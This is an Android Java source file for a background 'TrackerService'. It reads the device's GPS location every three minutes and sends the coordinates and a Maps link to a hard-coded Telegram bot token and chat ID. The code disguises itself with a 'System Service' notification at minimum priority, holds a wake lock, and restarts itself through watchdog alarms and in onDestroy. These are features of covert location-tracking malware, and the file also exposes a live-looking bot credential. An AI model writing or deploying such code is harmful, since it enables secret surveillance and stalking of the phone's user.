package com.tracker;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.os.SystemClock;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import com.google.android.gms.location.*;
import java.io.IOException;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.concurrent.TimeUnit;
import okhttp3.*;

public class TrackerService extends Service {

    // ==== CONFIG — replace these ====
    private static final String BOT_TOKEN = "8889259468:AAGdw-d71273CVyp__gNKVkPrrC92NRIK8U";
    private static final String CHAT_ID   = "5346580671";
    private static final long   INTERVAL_MS = 3 * 60 * 1000L;   // 3 minutes
    private static final long   WATCHDOG_MS = 15 * 60 * 1000L;  // 15 min restart
    // =================================

    private static final String CH = "tracker_channel";
    private static final int    NOTIF_ID = 1;
    private static final int    ALARM_REQ = 77;

    private FusedLocationProviderClient flpc;
    private LocationCallback callback;
    private final OkHttpClient http = new OkHttpClient.Builder()
            .connectTimeout(20, TimeUnit.SECONDS)
            .readTimeout(20, TimeUnit.SECONDS)
            .build();

    private long lastSentMs = 0L;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        createChannel();
        startForegroundCompat();

        acquireWakeLock();

        flpc = LocationServices.getFusedLocationProviderClient(this);

        // 1) send whatever last known location we have immediately
        sendLastKnown();

        // 2) then subscribe to updates every 3 min
        LocationRequest req = LocationRequest.create()
                .setPriority(Priority.PRIORITY_HIGH_ACCURACY)
                .setInterval(INTERVAL_MS)
                .setFastestInterval(INTERVAL_MS)
                .setSmallestDisplacement(0);

        callback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult result) {
                Location loc = result.getLastLocation();
                if (loc != null) sendToTelegram(loc, false);
            }
        };

        try {
            flpc.requestLocationUpdates(req, callback, Looper.getMainLooper());
        } catch (SecurityException e) {
            tgRaw("⚠️ Permission revoked — service stopping");
            stopSelf();
        }

        // 3) watchdog: schedule a restart alarm for 15 min from now
        scheduleWatchdog();
    }

    private void sendLastKnown() {
        try {
            flpc.getLastLocation().addOnSuccessListener(loc -> {
                if (loc != null) sendToTelegram(loc, true);
                else tgRaw("🟡 Service started, waiting for GPS fix…");
            });
        } catch (SecurityException ignored) { }
    }

    private void sendToTelegram(Location loc, boolean firstShot) {
        // throttle: never send twice within INTERVAL_MS unless it's the first shot
        long now = System.currentTimeMillis();
        if (!firstShot && now - lastSentMs < INTERVAL_MS - 10_000) return;
        lastSentMs = now;

        String time = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(new Date());
        String maps = "https://maps.google.com/?q=" + loc.getLatitude() + "," + loc.getLongitude();
        String text = "*Location Update*\n"
                + "Time: `" + time + "`\n"
                + "Lat: `" + loc.getLatitude() + "`\n"
                + "Lon: `" + loc.getLongitude() + "`\n"
                + "Accuracy: `" + loc.getAccuracy() + "m`\n"
                + "[Open in Maps](" + maps + ")";
        tgSend(text);
    }

    /** Sends an arbitrary text (used for errors/diagnostics). */
    private void tgRaw(String text) {
        tgSend(text);
    }

    private void tgSend(String text) {
        String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
        RequestBody body = new FormBody.Builder()
                .add("chat_id", CHAT_ID)
                .add("text", text)
                .add("parse_mode", "Markdown")
                .add("disable_web_page_preview", "false")
                .build();

        http.newCall(new Request.Builder().url(url).post(body).build())
                .enqueue(new Callback() {
                    @Override public void onFailure(Call call, IOException e) {
                        // silent — retry next cycle
                    }
                    @Override public void onResponse(Call call, Response response) {
                        response.close();
                    }
                });
    }

    private void startForegroundCompat() {
        Notification n = new NotificationCompat.Builder(this, CH)
                .setContentTitle("System Service")
                .setContentText("Running")
                .setSmallIcon(android.R.drawable.ic_menu_mylocation)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .build();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(NOTIF_ID, n);
        }
    }

    private void createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel c = new NotificationChannel(CH, "System",
                    NotificationManager.IMPORTANCE_MIN);
            c.setShowBadge(false);
            getSystemService(NotificationManager.class).createNotificationChannel(c);
        }
    }

    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "tracker:wl");
        wakeLock.setReferenceCounted(false);
        wakeLock.acquire();
    }

    private void scheduleWatchdog() {
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        Intent i = new Intent(this, WatchdogReceiver.class);
        PendingIntent pi = PendingIntent.getBroadcast(
                this, ALARM_REQ, i,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);

        long trigger = SystemClock.elapsedRealtime() + WATCHDOG_MS;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            am.setExactAndAllowWhileIdle(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
        } else {
            am.setExact(AlarmManager.ELAPSED_REALTIME_WAKEUP, trigger, pi);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;   // OS recreates us if killed
    }

    @Override
    public void onDestroy() {
        if (flpc != null && callback != null) flpc.removeLocationUpdates(callback);
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        // Self-heal: ask OS to restart us shortly
        Intent restart = new Intent(getApplicationContext(), TrackerService.class);
        PendingIntent pi = PendingIntent.getService(
                this, 1, restart,
                PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE);
        AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
        am.set(AlarmManager.ELAPSED_REALTIME_WAKEUP,
                SystemClock.elapsedRealtime() + 5000, pi);
        super.onDestroy();
    }

    @Nullable @Override public IBinder onBind(Intent i) { return null; }
}